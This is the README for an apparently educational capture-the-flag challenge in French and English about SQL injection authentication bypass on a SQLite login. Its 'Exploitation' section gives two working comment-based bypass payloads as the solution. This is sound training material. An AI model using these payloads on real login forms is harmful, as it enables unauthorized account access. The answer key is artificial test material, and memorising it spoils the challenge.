# sql-basics-1

## Description

Voici un challenge de sql injection bypass d'authentification sur une db sqlite. L'objectif est de se connecter en tant qu'admin et de lire le flag. Il n'y a aucun filtre.

## Enonce francais

InYourShell Industries Ldt. est une entreprise qui est très fière de sa sécurité. Connectez vous en tant qu'admin pour leur faire comprendre qu'ils ne sont pas si safe que ça.

## Enonce anglais

InYourShell Industries Ldt. is a company proud of its security. Bypass this authentication and connect as admin.

## Exploitation

Voici une liste de payloads fonctionnels:
```sql
admin' -- -
admin' /*
```

## Details techniques

Il faut modifier le port à votre guise dans le run.sh et le conf/vhost.conf